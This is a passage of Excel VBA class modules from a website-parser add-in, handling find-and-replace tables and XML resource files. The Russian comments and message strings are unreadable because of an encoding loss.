            For j = LBound(arr, 2) To UBound(arr, 2)
                newarr(i, j) = arr(i, j)
            Next j
        Next i
    Else
        ReDim newarr(1 To 1, 1 To 2)
    End If
    If Len(Description$) Then code$ = "{" & Trim(Replace(Replace(code$, "}", ""), "{", "")) & "}"
    newarr(UBound(newarr), 1) = code$: newarr(UBound(newarr), 2) = IIf(Len(Description$), Description$, txt$)

    Me.IsEmpty = False
    arr = newarr
End Sub

Sub PrepareRT_forQuickReplace()
    On Error Resume Next: Err.Clear
    If Not Me.UseWildcards Then Exit Sub
    If Me.CompareMode = 0 And Me.ReplaceMode = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For i = LBound(arr) To UBound(arr)
            If Right(arr(i, 1), 1) <> "*" Then arr(i, 1) = arr(i, 1) & "*"
            If Left(arr(i, 1), 1) <> "*" Then arr(i, 1) = "*" & arr(i, 1)
        Next i
        Me.CompareMode = 1        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    End If
End Sub

Function ApplyTo(ByRef SourceValue)
    If Me.IsEmpty Then Exit Function

    Dim i&, txt$
    txt$ = CStr(SourceValue)
    Select Case Me.ReplaceMode
        Case 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If Me.UseWildcards Then        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| * ? #
                If Me.CompareMode = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    For i = LBound(arr) To UBound(arr)
                        If txt Like arr(i, 1) Then txt = arr(i, 2): Exit For
                    Next i
                ElseIf Me.CompareMode = 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| PrepareRT_forQuickReplace
                    For i = LBound(arr) To UBound(arr)
                        If txt Like "*" & arr(i, 1) & "*" Then txt = arr(i, 2): Exit For
                    Next i
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Me.CompareMode = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    For i = LBound(arr) To UBound(arr)
                        If txt = arr(i, 1) Then txt = arr(i, 2): Exit For
                    Next i
                ElseIf Me.CompareMode = 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    For i = LBound(arr) To UBound(arr)
                        If InStr(1, txt, arr(i, 1), vbTextCompare) > 0 Then txt = arr(i, 2): Exit For
                    Next i
                End If
            End If
        Case 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If Me.CompareMode = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                For i = LBound(arr) To UBound(arr)
                    If txt = arr(i, 1) Then txt = arr(i, 2): Exit For
                Next i
            ElseIf Me.CompareMode = 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                For i = LBound(arr) To UBound(arr)
                    txt = Replace(txt, arr(i, 1), arr(i, 2), , , vbTextCompare)
                Next i
            End If
    End Select
    If txt$ <> CStr(SourceValue) Or (InStr(1, txt$, CStr(SourceValue), vbBinaryCompare) = 0) Then SourceValue = txt$
End Function


Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")

    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement("ReplaceTable"))
        node.Attributes.setNamedItem(.createAttribute("Name")).text = Me.Name
        node.Attributes.setNamedItem(.createAttribute("IsEmpty")).text = CBool(Me.IsEmpty)

        If Not Me.IsEmpty Then
            For i = LBound(arr) To UBound(arr)
                With node.appendChild(.createElement("Replacement"))
                    .Attributes.setNamedItem(XML.createAttribute("Find")).text = arr(i, 1)
                    .Attributes.setNamedItem(XML.createAttribute("ReplaceWith")).text = arr(i, 2)
                End With
            Next i
        End If
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next: Err.Clear
    If node Is Nothing Then Exit Sub
    If node.BaseName <> "ReplaceTable" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", vbCritical, "node.baseName <> ""ReplaceTable"""
        Exit Sub
    End If

    Me.Name = node.Attributes.getNamedItem("Name").text

    '    Dim LoadTableFromXLM As Boolean
    '    LoadTableFromXLM = node.Attributes.getNamedItem("Attach").Text = "True"

    '    If LoadTableFromXLM Then
    Dim replacements As IXMLDOMNodeList, Replacement As IXMLDOMElement
    Set replacements = node.SelectNodes("Replacement")
    If replacements.Length = 0 Then Me.IsEmpty = True: Exit Sub

    For Each Replacement In replacements
        Me.AddReplacement Replacement.Attributes.getNamedItem("Find").text, Replacement.Attributes.getNamedItem("ReplaceWith").text
    Next
    Me.IsEmpty = False
    '    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    '        Err.Clear
    '        Dim RT As ReplaceTable
    '        Set RT = All_RT.GetItemByName(Me.Name)
    '        Me.arr = RT.arr: Me.IsEmpty = RT.IsEmpty
    '    End If
End Sub

Attribute VB_Name = "ReplaceTables"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Class Module      : ReplaceTables
' Author        : EducatedFool                     Date: 25.04.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Public Items As New Collection

Private Sub Class_Terminate()
    Set Items = Nothing
End Sub

Function SupportedInterfaces() As Variant
    ' ARRAY ( CREATE, EDIT, CLONE, DELETE )
    SupportedInterfaces = Array(1, 1, 0, 1)
End Function

Sub Edit()
    On Error Resume Next
    With FP_Objects
        .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"    '& " (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CURRENT_SET$ & ")"
        Set .All_Items = All_RT
        .Show
        .Initialize
    End With
End Sub

Function TableExist(ByVal RT_name$, Optional ByRef XML_filename$) As Boolean
    On Error Resume Next: Err.Clear
    RT_name$ = FWF.Replace_symbols(RT_name$, , True)
    If Trim(RT_name$) = "" Then Exit Function
    FileName$ = REPLACE_TABLES_FOLDER$ & RT_name$ & REPLACE_TABLE_EXT$
    If Dir(FileName$, vbNormal) <> "" Then
        TableExist = True
        XML_filename$ = FileName$
    End If
End Function

Function GetItemByName(ByVal RT_name$) As ReplaceTable
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim RT As New ReplaceTable, FileName$
    If Me.TableExist(RT_name$, FileName$) Then RT.Load FileName$, RT_name$
    Set GetItemByName = RT
End Function

Function ArrayOfIndexesAndNames() As Variant
    On Error Resume Next
    RTfolder$ = REPLACE_TABLES_FOLDER$
    Dim coll As Collection: Set coll = FWF.FilenamesCollection(RTfolder$, "*" & REPLACE_TABLE_EXT$)
    If coll.Count = 0 Then ArrayOfIndexesAndNames = Array(): Exit Function
    ReDim arr(1 To coll.Count, 1 To 2)  ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 1 To coll.Count
        RT_name$ = Replace(coll(i), RTfolder$, "")
        RT_name$ = Left(RT_name$, Len(RT_name$) - Len(REPLACE_TABLE_EXT$))
        arr(i, 1) = i
        arr(i, 2) = RT_name$
    Next i
    ArrayOfIndexesAndNames = arr
End Function

Function ArrayOfNames() As Variant
    On Error Resume Next
    RTfolder$ = REPLACE_TABLES_FOLDER$
    Dim coll As Collection: Set coll = FWF.FilenamesCollection(RTfolder$, "*" & REPLACE_TABLE_EXT$)
    If coll.Count = 0 Then ArrayOfNames = Array(): Exit Function
    ReDim arr(0 To coll.Count)  ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 1 To coll.Count
        RT_name$ = Replace(coll(i), RTfolder$, "")
        RT_name$ = Left(RT_name$, Len(RT_name$) - Len(REPLACE_TABLE_EXT$))
        arr(i) = RT_name$
    Next i
    ArrayOfNames = arr
End Function

Function Add(ByVal RT_name$, Optional ByVal Start_RT_Name$) As ReplaceTable
    On Error Resume Next: Err.Clear
    If RT_name$ = "" Then
        RT_name$ = GetNameForNewRT(Start_RT_Name$)
        If RT_name$ = "" Then Exit Function
    End If

    RT_name$ = FWF.Replace_symbols(RT_name$)
    If TableExist(RT_name$) Then Set Add = All_RT.GetItemByName(RT_name$): Exit Function

    Set Add = New ReplaceTable
    With Add
        .Name = RT_name$
        .FileName = REPLACE_TABLES_FOLDER$ & RT_name$ & REPLACE_TABLE_EXT$
        .IsFormulaRT = False
        .IsEmpty = True
        .Save
    End With
End Function

Function GetNameForNewRT(Optional ByVal Start_RT_Name$) As String
    On Error Resume Next
    Dim Def_RT_Name$
    If Len(Start_RT_Name$) > 0 Then If Not TableExist(Start_RT_Name$) Then Def_RT_Name$ = Start_RT_Name$

InputName:
    If Trim(NewConfigName$) = "" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        res = Application.InputBox(msg, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Def_RT_Name$, , , , , 2)
        If VarType(res) = vbBoolean Then Exit Function
        NewRT_Name$ = FWF.Replace_symbols(CStr(res))
        If Trim(NewRT_Name$) = "" Then
            MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            GoTo InputName
        End If
        If TableExist(NewRT_Name$) Then
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & NewRT_Name$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Def_RT_Name$ = NewRT_Name$
            GoTo InputName
        End If
    End If
    GetNameForNewRT = NewRT_Name$
End Function

Attribute VB_Name = "ResourceFile"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ResourceFile
' Author        : Igor Vakhnenko            Date: 03.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Resources", XML_SUBNODE_NAME$ = "Object"

Public FileName As String
Public Name As String

Public Items As New Collection

Private Sub Class_Terminate()
    Set Items = Nothing
End Sub

Function GetObjectsByType(ByVal ObjType$) As Dictionary
    On Error Resume Next
    Set GetObjectsByType = New Dictionary
    Dim RFO As ResourceFileObject, obj As Object
    
    For Each RFO In Me.Items
        If RFO.ObjectType Like ObjType$ Then
            GetObjectsByType.Add RFO.ID, RFO.ConvertToObject
        End If
    Next
    Set RFO = Nothing
End Function

Function GetObjectByID(ByVal ID$) As Object
    On Error Resume Next
    Dim RFO As ResourceFileObject, obj As Object
    
    For Each RFO In Me.Items
        If RFO.ID = ID$ Then Set GetObjectByID = RFO.ConvertToObject: Exit For
    Next
    Set RFO = Nothing
End Function

Function DeleteObject(ByVal ID$) As Boolean
    On Error Resume Next: Err.Clear
    Dim cnt&, msg$, RFO As ResourceFileObject
    Set RFO = Me.Items(CStr(ID$))
    If RFO Is Nothing Then Exit Function
    msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RFO.GetObjectType & " |fffd|" & RFO.Name & "|fffd|" & vbNewLine & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|?" & vbNewLine & vbNewLine & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
    If MsgBox(msg$, vbYesNo + vbQuestion + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Function
    
    cnt& = Me.Items.Count
    Me.Items.Remove (CStr(ID$))
    cnt& = cnt& - Me.Items.Count
    
    If cnt& = 1 Then DeleteObject = True: Me.Save ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function UpdateObjectByID(ByVal ID$, ByRef obj As Object, Optional ByVal ObjectName$) As Boolean
    On Error Resume Next
    If obj Is Nothing Then Exit Function
    If ObjectName$ = "" Then ObjectName$ = obj.Name
    
    Dim RFO As ResourceFileObject
    For Each RFO In Me.Items
        If RFO.ID = ID$ Then
            RFO.Name = ObjectName$
            RFO.Content = obj.ExportToXML.XML
            If Err Then
                MsgBox "This object doesn't support 'ExportToXML' method", vbCritical, "Add object into resource file error"
                Exit Function
            End If
            
            Me.Save
            UpdateObjectByID = True
            Exit For
        End If
    Next
    Set RFO = Nothing
End Function

Function AddObject(ByVal ObjectType$, ByRef obj As Object, Optional ByVal ObjectName$) As Boolean
    On Error Resume Next
    If obj Is Nothing Then Exit Function
    If ObjectName$ = "" Then ObjectName$ = obj.Name
    
    Dim RFO As ResourceFileObject
    Set RFO = New ResourceFileObject
    With RFO
        Set .Parent = Me
        .ObjectType = ObjectType$
        .Name = ObjectName$
        .ID = EasyHash(Rnd(Now) & ObjectType$ & ObjectName$)
        Err.Clear
        .Content = obj.ExportToXML.XML
        If Err Then
            MsgBox "This object doesn't support 'ExportToXML' method", vbCritical, "Add object into resource file error"
            Exit Function
        End If
        If .Content = "" Then Exit Function
    End With
    Items.Add RFO, CStr(RFO.ID)
    AddObject = True
End Function

Function GetDescription() As String
    On Error Resume Next
    Dim i&, RFO As ResourceFileObject, txt$
    If Me.Items.Count = 0 Then GetDescription = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|": Exit Function
    
    Dim dic As New Dictionary, key: dic.CompareMode = TextCompare
    
    For Each RFO In Me.Items
        With RFO
            dic.item(.ObjectType) = Val(dic.item(.ObjectType)) + 1
        End With
    Next
    
    For Each key In dic.Keys
        txt$ = txt$ & IIf(txt$ = "", "", ", ") & dic.item(key) & " " & key & IIf(Val(dic.item(key)) = 1, "", "s")
    Next key
    GetDescription = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.Items.Count & " (" & txt$ & ")"
    
    Set RFO = Nothing:   Set dic = Nothing
End Function

Function ToArray() As Variant
    On Error Resume Next
    Dim i&, RFO As ResourceFileObject
    If Me.Items.Count = 0 Then
        ReDim res(0 To 0, 0 To 4)
        res(0, 1) = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
    Else
        ReDim res(0 To Me.Items.Count + 1, 0 To 4)
        res(0, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(0, 2) = Me.Items.Count
        
        For i = 1 To Me.Items.Count
            Set RFO = Me.Items(i)
            res(1 + i, 0) = i
            res(1 + i, 1) = RFO.GetObjectType
            res(1 + i, 2) = RFO.Name
        Next i
    End If
    Set RFO = Nothing
    ToArray = res
End Function

'Sub Edit()
'    On Error Resume Next
'End Sub

Function Load(ByVal xmlPath$) As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| XML
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, n&
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        If Not .Load(xmlPath$) Then
            Exit Function
        End If
        
        Me.FileName = xmlPath$
        Set node = XML.SelectSingleNode(XML_NODE_NAME$)
        Me.Name = Dir(xmlPath$, vbNormal)
        
        Dim subnode As IXMLDOMElement, RFO As ResourceFileObject
        Set Me.Items = New Collection
        
        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set RFO = New ResourceFileObject
            Set RFO.Parent = Me
            RFO.LoadFromXML subnode
            If RFO.Content <> "" Then Items.Add RFO, CStr(RFO.ID)
        Next
        Load = True
    End With
End Function

Function SaveAs(ByVal xmlPath$) As String
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, RFO   As ResourceFileObject
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")
        
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        
        For Each RFO In Me.Items
            node.appendChild RFO.ExportToXML
        Next RFO
        
        If Len(xmlPath$) > 0 Then .Save xmlPath$
        SaveAs = .XML
    End With
End Function

Sub Save()
    SaveAs FileName
End Sub

Sub Delete()
    On Error Resume Next: Err.Clear
    If MsgBox("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|?", _
        vbYesNo + vbQuestion + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
    Kill Me.FileName
End Sub







Attribute VB_Name = "ResourceFileObject"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ResourceFileObject
' Author        : Igor Vakhnenko            Date: 03.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Object"
Public Parent As ResourceFile

Public ID As String
Public Name As String
Public ObjectType As String
Public Content As String

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Function ConvertToObject() As Object
    On Error Resume Next
    Dim obj, XMLnode   As IXMLDOMElement
    Set XMLnode = Get_DOMElement_FromXML(Me.Content)
    If XMLnode Is Nothing Then
        If Developer Then AddBalloon "ERROR: XMLnode is Nothing. Function ConvertToObject in module ResourceFileObject"
        Exit Function
    End If
    
    Select Case Me.ObjectType
        Case "Column"
            Set obj = New OutputColumn
        Case "Download"
            Set obj = New ParserDownload
        Case "ActionSet"
            Set obj = New ActionSet
        Case "Macro"
            Set obj = New ParserMacro
    End Select
    obj.LoadFromXML XMLnode
    obj.Source = Me.Parent.Name
    
    Set ConvertToObject = obj
End Function

Function GetObjectType() As String
    Select Case ObjectType
        Case "Column": GetObjectType = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case "Download": GetObjectType = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Case "ActionSet": GetObjectType = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case "Macro": GetObjectType = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case Else: GetObjectType = ObjectType
    End Select
End Function

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("ID")).text = Me.ID
            .Attributes.setNamedItem(XML.createAttribute("Type")).text = Me.ObjectType
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            
            .appendChild Get_DOMElement_FromXML(Me.Content)
        End With
    End With
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    
    With node
        Me.ID = .Attributes.getNamedItem("ID").text
        Me.Name = .Attributes.getNamedItem("Name").text
        Me.ObjectType = .Attributes.getNamedItem("Type").text
        
        Me.Content = .FirstChild.XML
    End With
End Sub



Attribute VB_Name = "ResourceFiles"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ResourceFiles
' Author        : Igor Vakhnenko            Date: 03.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Public Items As New Collection
Public Parent As WebsiteParser

Public ObjectsCache As New Dictionary ' |fffd||fffd||fffd||fffd| - ObjType$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| Dictionary |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set Items = Nothing
    Set ObjectsCache = Nothing
End Sub

Sub Initialize()
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Dim dic As Dictionary, key, ASet As ActionSet
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set Me.Parent.AASets.ExtraItems = New Collection
    
    Set dic = Me.Parent.Resources.GetObjectsByType("ActionSet")
    For Each key In dic.Keys
        Set ASet = dic.item(key)
        ASet.ObjectID = key
        Set ASet.Actions.ParentParser = Me.Parent
        Me.Parent.AASets.ExtraItems.Add ASet
    Next
    
End Sub

Sub ResetCache()
    Set ObjectsCache = New Dictionary
End Sub

Function GetObjectsByType(ByVal ObjType$) As Dictionary
    On Error Resume Next
    Dim file, dic As Dictionary, key, res As New Dictionary
    For Each file In Me.GetFileList
        Set dic = Nothing: Set dic = Me.GetItemByName(file).GetObjectsByType(ObjType$)
        For Each key In dic.Keys
            res.Add key, dic.item(key)
        Next
    Next
    Set dic = Nothing
    Set GetObjectsByType = res
End Function

'Function GetObjectsByType(ByVal ObjType$) As Dictionary
